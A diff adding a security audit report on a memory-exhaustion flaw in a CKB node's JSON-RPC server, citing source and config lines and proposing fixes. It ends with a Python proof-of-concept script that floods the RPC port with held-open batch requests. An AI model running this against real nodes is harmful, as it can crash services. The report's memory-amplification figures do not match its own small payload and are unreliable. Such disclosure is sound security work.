@@ -1,0 +1,185 @@
+Audit Report
+
+## Title
+JSON-RPC Batch Deserialization Before Size Check with Unenforced Body Limit Enables Memory Exhaustion — (`File: rpc/src/server.rs`)
+
+## Summary
+
+`rpc/src/server.rs` fully deserializes the entire JSON-RPC payload via `serde_json::from_str::<Request>` before checking the batch element count. The `JSONRPC_BATCH_LIMIT` guard is disabled by default (commented out in `resource/ckb.toml`). Separately, `RpcConfig::max_request_body_size` is declared and documented but is never passed into `start_server` and is never applied to the axum router, so the operator-configured limit is silently ignored. An attacker with access to the RPC port can send many concurrent large batch payloads to amplify heap allocations and OOM-kill the node.
+
+## Finding Description
+
+**Root cause 1 — `max_request_body_size` never reaches the router.**
+
+`start_server` accepts only `rpc`, `address`, `handler`, and `enable_websocket` — the `RpcConfig` struct is not passed in at all:
+
+```rust
+fn start_server(
+    rpc: &Arc<MetaIoHandler<Option<Session>>>,
+    address: String,
+    handler: Handle,
+    enable_websocket: bool,
+) -> Result<SocketAddr, AnyError>
+``` [1](#0-0) 
+
+The router is built with no body-size layer:
+
+```rust
+let app = Router::new()
+    .route("/", method_router.clone())
+    ...
+    .layer(CorsLayer::permissive())
+    .layer(TimeoutLayer::with_status_code(...))
+    .layer(Extension(stream_config));
+``` [2](#0-1) 
+
+A grep for `DefaultBodyLimit`, `RequestBodyLimitLayer`, and `body_limit` across the entire repo returns zero matches. The field is defined and documented: [3](#0-2) 
+
+And set to 10 MiB in the shipped config: [4](#0-3) 
+
+But it is never wired to the router. Axum 0.7's own 2 MiB default applies instead, meaning the operator-configured value is silently ignored in both directions (operators who raise it to allow large payloads get no effect; operators who lower it get no effect either).
+
+**Root cause 2 — Full deserialization before batch count check.**
+
+`handle_jsonrpc` calls `serde_json::from_str::<Request>(req)` unconditionally at line 238, allocating the full `Vec<Call>` for every batch: [5](#0-4) 
+
+Only after this allocation does the code branch on `Request::Batch` and consult `JSONRPC_BATCH_LIMIT`: [6](#0-5) 
+
+**Root cause 3 — Batch limit is `None` in default deployments.**
+
+`JSONRPC_BATCH_LIMIT` is a `OnceLock<usize>` initialized only when `config.rpc_batch_limit` is `Some`: [7](#0-6) 
+
+In the shipped default config, `rpc_batch_limit` is commented out: [8](#0-7) 
+
+So `JSONRPC_BATCH_LIMIT.get()` returns `None` on every default node, and the guard at line 275 is never evaluated.
+
+**Exploit chain:**
+1. Attacker sends a POST body near axum's 2 MiB default limit containing a JSON array of hundreds of batch items.
+2. `handle_jsonrpc` deserializes the full array into a `Vec<Call>` on the heap (each `Call` carries `Params::Array(Vec<Value>)` with string/object overhead — 6–8× wire-size amplification is realistic).
+3. `JSONRPC_BATCH_LIMIT.get()` returns `None`; no rejection occurs.
+4. Attacker opens many concurrent connections, each holding its allocation while the stream processes calls sequentially.
+5. Heap grows proportionally to concurrent connections × amplified batch size; node is OOM-killed.
+
+## Impact Explanation
+
+An attacker can crash the CKB node process via OOM, stopping block processing, transaction relay, and peer communication. This matches the allowed bounty impact: **High (10001–15000 points) — Vulnerabilities which could easily crash a CKB node.** The two independent gaps (unenforced body limit, no default batch count limit) compound each other: even with axum's 2 MiB floor, many concurrent connections each amplifying to ~12–16 MiB can exhaust available memory on a typical node host.
+
+## Likelihood Explanation
+
+The RPC port binds to `127.0.0.1:8114` by default, restricting remote exploitation. However, any local process (scripts, CI, SSRF from a co-located service) qualifies. The optional TCP (`tcp_listen_address`) and WebSocket (`ws_listen_address`) endpoints may be bound to external interfaces. No authentication, chain knowledge, or special privilege is required — only the ability to POST to the RPC port. Both protections are disabled in the default shipped configuration, making the condition trivially reproducible on any default node.
+
+## Recommendation
+
+1. **Pass `RpcConfig` into `start_server`** and add `DefaultBodyLimit::max(config.max_request_body_size)` as a layer so the operator-configured limit is actually enforced before the body reaches `handle_jsonrpc`.
+2. **Check batch count before full deserialization.** Use a streaming or pre-scan approach (e.g., count top-level array elements in raw bytes) before calling `serde_json::from_str::<Request>`.
+3. **Enable `rpc_batch_limit` by default.** Change the shipped config from a commented-out `# rpc_batch_limit = 2000` to an active conservative default (e.g., `rpc_batch_limit = 100`).
+4. **Add per-connection concurrency limiting** on the HTTP handler to bound simultaneous large deserializations.
+
+## Proof of Concept
+
+```python
+import socket, json, time
+
+single = {"jsonrpc": "2.0", "method": "get_tip_block_number", "params": [], "id": 1}
+# Fill toward axum's 2 MiB default with many batch items
+batch = [single] * 500
+payload = json.dumps(batch).encode()
+print(f"Wire size: {len(payload)/1024:.1f} KB")
+
+for _ in range(50):   # 50 concurrent connections
+    s = socket.socket()
+    s.connect(("127.0.0.1", 8114))
+    http = (
+        f"POST / HTTP/1.1\r\nHost: localhost\r\n"
+        f"Content-Type: application/json\r\n"
+        f"Content-Length: {len(payload)}\r\n\r\n"
+    ).encode() + payload
+    s.sendall(http)
+    # Do not read response — keep connection open to hold allocation
+    time.sleep(0.01)
+
+print("Monitor node RSS for amplified heap growth.")
+```
+
+**Execution path:**
+1. Each POST body is accepted (no enforced size limit beyond axum's 2 MiB floor).
+2. `handle_jsonrpc` → `serde_json::from_str::<Request>` at line 238 allocates the full `Vec<Call>`.
+3. `JSONRPC_BATCH_LIMIT.get()` returns `None` (default config) → no rejection.
+4. 50 concurrent connections each hold their amplified allocation while processing sequentially.
+5. Node RSS grows to `50 × ~12–16 MiB = ~600–800 MiB`; scaling connections further triggers OOM.
+
+### Citations
+
+**File:** rpc/src/server.rs (L53-55)
+```rust
+        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
+            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
+        }
+```
+
+**File:** rpc/src/server.rs (L97-102)
+```rust
+    fn start_server(
+        rpc: &Arc<MetaIoHandler<Option<Session>>>,
+        address: String,
+        handler: Handle,
+        enable_websocket: bool,
+    ) -> Result<SocketAddr, AnyError> {
+```
+
+**File:** rpc/src/server.rs (L119-129)
+```rust
+        let app = Router::new()
+            .route("/", method_router.clone())
+            .route("/{*path}", method_router)
+            .route("/ping", get(ping_handler))
+            .layer(Extension(Arc::clone(rpc)))
+            .layer(CorsLayer::permissive())
+            .layer(TimeoutLayer::with_status_code(
+                StatusCode::REQUEST_TIMEOUT,
+                Duration::from_secs(30),
+            ))
+            .layer(Extension(stream_config));
+```
+
+**File:** rpc/src/server.rs (L238-238)
+```rust
+    let req = serde_json::from_str::<Request>(req);
+```
+
+**File:** rpc/src/server.rs (L274-282)
+```rust
+            Request::Batch(calls) => {
+                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
+                    && calls.len() > *batch_size
+                {
+                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
+                        "batch size is too large, expect it less than: {}",
+                        batch_size
+                    )));
+                }
+```
+
+**File:** util/app-config/src/configs/rpc.rs (L39-44)
+```rust
+    /// Max request body size in bytes.
+    pub max_request_body_size: usize,
+    /// Number of RPC worker threads.
+    pub threads: Option<usize>,
+    /// Number of RPC batch limit.
+    pub rpc_batch_limit: Option<usize>,
+```
+
+**File:** resource/ckb.toml (L186-187)
+```text
+# Default is 10MiB = 10 * 1024 * 1024
+max_request_body_size = 10485760
+```
+
+**File:** resource/ckb.toml (L205-208)
+```text
+# By default, there is no limitation on the size of batch request size
+# a huge batch request may cost a lot of memory or makes the RPC server slow,
+# to avoid this, you may want to add a limit for the batch request size.
+# rpc_batch_limit = 2000
+```
